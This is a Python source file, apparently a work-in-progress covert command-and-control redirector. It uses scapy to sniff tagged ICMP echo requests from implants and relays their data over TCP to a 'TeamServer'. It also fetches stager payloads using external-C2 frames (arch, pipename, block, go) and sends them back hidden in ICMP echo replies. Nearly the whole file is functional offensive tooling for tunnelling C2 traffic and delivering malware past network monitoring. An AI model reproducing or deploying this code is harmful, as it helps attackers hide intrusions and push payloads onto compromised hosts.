import logging
from scapy.all import sniff, send, IP, ICMP, Raw
import struct
import socket
import math
import time
# Configure logging
logging.basicConfig(level=logging.DEBUG, format="%(message)s")

ICMP_TAG = "RQ47"
TAG_SIZE = len(ICMP_TAG)
ICMP_PAYLOAD_SIZE = 1000
MAX_DATA_PER_CHUNK = ICMP_PAYLOAD_SIZE - TAG_SIZE  # 996


class Client:
    def __init__(self, client_ip, icmp_id, tag, expected_inbound_data_size = 0):
        logging.info(f"[+] Listening for transmission of {expected_inbound_data_size} total bytes, "
                     f"from {client_ip}, ID={icmp_id}, tag={tag}")
        self.client_ip = client_ip
        self.icmp_id = icmp_id
        self.tag = tag
        self.expected_inbound_data_size = expected_inbound_data_size

        self.server_ip = "10.10.10.21"
        self.server_port = 2222

        # data from client. Appended to each packet.
        self.data_from_client = b""
        self.payload = b""

        # need to connect to teamserver RIGHT AWAY
        self.ts_socket_setup()

    # def sniffer(self):
    #     """
    #     Sniffs for all packets coming in that match the client_ip, icmp_id, tag. If so, does something with them.
    #     """
    #     sniff(filter="icmp", prn=self.construct_packet, store=0)

    # def construct_packet(self, packet):
    #     ######################################################
    #     # Filter packets & get data
    #     ######################################################
    #     #if not (packet.haslayer(ICMP) and packet[ICMP].type == 8 and packet.haslayer(Raw)):
    #     #    logging.warning(f"[!]Invalid Packet - Not type 8 OR no data")
    #     #    print(packet[Raw].load)
    #     #    return

    #     raw_load = (packet[Raw].load)
    #     # Discard anything not prefixed by our TAG
    #     if not raw_load.startswith(self.tag.encode()):
    #         logging.warning(f"[!] Invalid Packet, contents: {raw_load}")
    #         return
        
    #     client_ip = packet[IP].src
    #     icmp_id = packet[ICMP].id & 0xFFFF
    #     icmp_seq = packet[ICMP].seq & 0xFFFF

    #     stripped_load = raw_load.rstrip(b"\x00").lstrip(b"RQ47") # Strip all trailing bytes & the tag cuz the server sends that atm
    #     logging.debug(f"[+] Data from Client: {stripped_load}")
    #     logging.info(f"[+ SNIFFER] packet seq={icmp_seq} received, from {self.client_ip}, ID={self.icmp_id}, tag={self.tag}")
        
    #     # add to current data received
    #     self.data_from_client += stripped_load

    #     # if last chunk, call handle data...

    def handle_data(self):
        '''
        This is meant to be called *after* all the payload is received. 
        


        ~~problem - decrpytion error.something isn't getting sent correctly~~ fixed
         > Fixed, beacon now sends intiial packet. Follow up packets don't go through yet.
        
         
         Problem may be the controller not sending what it needs to again? Client may be hanging? IDK
        '''
        # need to make sure this buffer is clear each new checkin
        self.data_from_client = b""

        ######################################################
        # Get the inbound data (post seq 0)
        ######################################################
        self.recv_fragmented_icmp()

        ######################################################
        # Logic/Special Conditions
        ######################################################

        # need to add a special case to get the payload, as when sending payload options, the team server does not reply,
        # meaning that it just hangs there... so we need to do this so the controller can explicitly ask for the payload, then pass it on. 
        if self.data_from_client == b"I WANT A PAYLOAD":
            logging.info("[+] Sending payload to Client")
            self.send_fragmented_icmp(client_ip = self.client_ip, client_icmp_id=self.icmp_id, full_payload=self.get_payload())
            # wipe data after
            return

        ######################################################
        # Proxy
        ######################################################

        # forward onto teamserver
        logging.debug(f"[+ PROXY] Forwarding data to TeamServer: {self.data_from_client}")
        self.ts_send_frame(self.data_from_client)

        #Get response from TS
        logging.debug("[+ PROXY] Getting response from TeamServer")
        data_from_ts_for_client = self.ts_recv_frame()

        # send to client
        self.send_fragmented_icmp(client_ip=self.client_ip, client_icmp_id=self.icmp_id, full_payload=data_from_ts_for_client)
        

    def get_payload(self)-> bytes:
        """
        Get payload from TeamServer
        """
        logging.info("[+] Getting Payload from <TeamServerIP>")
        self.ts_send_frame(b"arch=x86")
        self.ts_send_frame(b"pipename=foobar")
        self.ts_send_frame(b"block=100")
        self.ts_send_frame(b"go")
        self.payload = self.ts_recv_frame()
        logging.debug(f"[+] Received payload: {self.payload}")

        if self.payload != b"":
            logging.info(f"[+] Payload from <TeamServerIP> recieved successfully")
        return self.payload

    def send_payload(self):
        """
        Sends payload to client
        """
        if self.payload == b"":
            self.get_payload()

            self.send_fragmented_icmp(
                client_ip=self.client_ip,
                client_icmp_id=self.icmp_id,
                full_payload=self.payload,
            )

    def send_fragmented_icmp(self, client_ip, client_icmp_id, full_payload, tag=b"RQ47"):
        """
        Fragment `full_payload` into (ICMP_PAYLOAD_SIZE - TAG_SIZE) bytes each,
        and send immediately (no extra wait). The first reply is seq=0 (size),
        then seq=1..N data chunks.
        """
        # 1) Send seq=0 reply with total-size (4 bytes)
        total_size = len(full_payload)
        size_bytes = total_size.to_bytes(4, "big")

        print(f"[*] Sending seq=0 reply to {client_ip} (ID={client_icmp_id}). Total payload={total_size} bytes")
        self.send_icmp_packet(
            ip_dst=client_ip,
            icmp_id=client_icmp_id,
            icmp_seq=0,
            payload=size_bytes,
            tag=tag
        )

        # 2) Send actual data in (ICMP_PAYLOAD_SIZE - TAG_SIZE) byte chunks
        CHUNK_DATA_SIZE = ICMP_PAYLOAD_SIZE - len(tag)  # e.g. 500 - 4 = 496

        offset = 0
        seq = 1
        while offset < len(full_payload):
            chunk = full_payload[offset : offset + CHUNK_DATA_SIZE]
            print(f"    → Sending data chunk seq={seq}, data_bytes={len(chunk)}")
            self.send_icmp_packet(
                ip_dst=client_ip,
                icmp_id=client_icmp_id,
                icmp_seq=seq,
                payload=chunk,
                tag=tag
            )
            offset += CHUNK_DATA_SIZE
            seq += 1
            time.sleep(.1)

    def recv_fragmented_icmp(self):
        """
        Blocks until we’ve seen exactly self.expected_inbound_data_size bytes
        from (self.client_ip, self.icmp_id, tag=self.tag). Returns the assembled bytes.
        """
        expected_len = self.expected_inbound_data_size
        assembled_data = bytearray()

        max_data_per_chunk = ICMP_PAYLOAD_SIZE - TAG_SIZE  # e.g. 1000 - 4 = 996

        while len(assembled_data) < expected_len:
            # Wait for the next ICMP Echo-Request from this client/ipc_id/tag
            matching_pkts = sniff(
                filter=f"icmp and src host {self.client_ip}",
                lfilter=lambda p: (
                    p.haslayer(ICMP)
                    and p[ICMP].type == 8
                    and p[ICMP].id == self.icmp_id
                    and p.haslayer(Raw)
                    and p[Raw].load.startswith(self.tag.encode())
                ),
                count=1
            )
            incoming_pkt = matching_pkts[0]
            raw_load = incoming_pkt[Raw].load
            chunk_data = raw_load[TAG_SIZE:]  # strip off the 4-byte tag

            bytes_needed = expected_len - len(assembled_data)
            chunk_part = chunk_data[:bytes_needed]
            assembled_data += chunk_part

            # For logging
            icmp_seq = incoming_pkt[ICMP].seq & 0xFFFF
            self.data_from_client += chunk_part

            logging.debug(f"[+] Received chunk_data: {chunk_part!r}")
            logging.info(
                f"[+ SNIFFER] packet seq={icmp_seq} received from {self.client_ip}, "
                f"ID={self.icmp_id}, tag={self.tag}"
            )

        return bytes(assembled_data)


    def send_icmp_packet(self, ip_dst, icmp_id, icmp_seq, payload, tag=b"RQ47"):
        """
        Always send as an Echo Reply (type 0).
        """
        full_payload = tag + payload
        packet = IP(dst=ip_dst) / ICMP(type=0, id=icmp_id, seq=icmp_seq) / Raw(load=full_payload)
        send(packet, verbose=False)
        logging.debug(f"[+] Sent ICMP REPLY seq={icmp_seq}, len={len(full_payload)}")



    def ts_recv_frame(self):
        #self.sock.setblocking(False)
        #self.sock.settimeout(2)
        raw_size = self.sock.recv(4)
        print(raw_size)
        logging.debug(f"Frame coming from TeamServer: {raw_size}")
        if len(raw_size) < 4:
            logging.warning(f"TeamServer: Failed to read frame size: {raw_size}")
            raise ConnectionError("Failed to receive frame size.")
        size = struct.unpack('<I', raw_size)[0]

        buffer = b''
        while len(buffer) < size:
            chunk = self.sock.recv(size - len(buffer))
            if not chunk:
                raise ConnectionError("Socket closed before full frame received.")
            buffer += chunk

        return buffer

    def ts_send_frame(self, data: bytes):
        size = len(data)
        logging.debug(f"Frame going to TeamServer: size: {size} data:{data}")
        self.sock.sendall(struct.pack('<I', size))
        self.sock.sendall(data)

    def ts_socket_setup(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10)  # 10 sec timeout
        try:
            self.sock.connect((self.server_ip, self.server_port))
            logging.info(f"[+] Connected to TeamServer at {self.server_ip}:{self.server_port}")
        except socket.timeout:
            logging.info(f"[!] Socket timed out - is listener up at {self.server_ip}:{self.server_port}?")
            self.sock.close()
            exit()
        except Exception as e:
            logging.info(f"[-] Connection failed: {e}")
            self.sock.close()
            self.sock = None
            exit()


dict_of_clients = {}

def go():
    logging.info("[+] Starting ICMP Listener")
    sniff(filter="icmp", prn=packet_filter, store=0)


def packet_filter(packet):
    """
    Filters initial packets
    """
    # check to make sure packet is correct type, has Raw data
    if not (packet.haslayer(ICMP) and packet[ICMP].type == 8 and packet.haslayer(Raw)):
        return

    raw_load = packet[Raw].load
    # Make sure packet has our tag.
    if not raw_load.startswith(ICMP_TAG.encode()):
        return

    # extract data from packet
    client_ip = packet[IP].src
    icmp_id = packet[ICMP].id & 0xFFFF
    icmp_seq = packet[ICMP].seq & 0xFFFF

    # When we see seq=0, that signals “start of a new transfer”
    if icmp_seq == 0:
        logging.info(f"[+] New seq=0 packet received from {client_ip}, ID={icmp_id}")

        # Strip off the 4-byte tag (“RQ47”)
        content = raw_load[len(ICMP_TAG):].rstrip(b"\x00")
        logging.info(f"[+] seq=0 content: {content}")

        # every other interaction will be here, where it sends a size in seq 0
        expected_inbound_data_size = int.from_bytes(content[:4], "big")
        if expected_inbound_data_size < 0:
            raise ValueError(f"Invalid length={expected_inbound_data_size} in seq=0")

        # if client alreadt in dict, based on id, use that class to handle it
        # problem, this cuold collide if same pid, could just add in ip as well.
        key = icmp_id
        if key in dict_of_clients:
            logging.info("Client already existed")
            new_size = int.from_bytes(raw_load[TAG_SIZE:TAG_SIZE+4], "big")
            client = dict_of_clients[key]
            # set new expected size for the client to recieve
            client.expected_inbound_data_size = new_size

        else:
            logging.info("New Client!")
            client = Client(client_ip=client_ip,
                            icmp_id=icmp_id,
                            tag=ICMP_TAG,
                            expected_inbound_data_size=expected_inbound_data_size)
            dict_of_clients[key] = client

        # Now that we have (or just created) a Client instance, invoke its handler:
        client.handle_data()

if __name__ == "__main__":
    go()


'''
LEFT OFF:
payloads can get sent successfully.

Need to now impelement other side,so that normal seq=0 with NO "PAYLOAD" act as a proxy as intended. 

>> do this one:
OR the better option, just have the client send the get payload commands, THROUGH the proxy. This allows for way less complexty, and each seq=0 to just be for size.
        self.ts_send_frame(b"arch=x86")
        self.ts_send_frame(b"pipename=foobar")
        self.ts_send_frame(b"block=100")
        self.ts_send_frame(b"go")


'''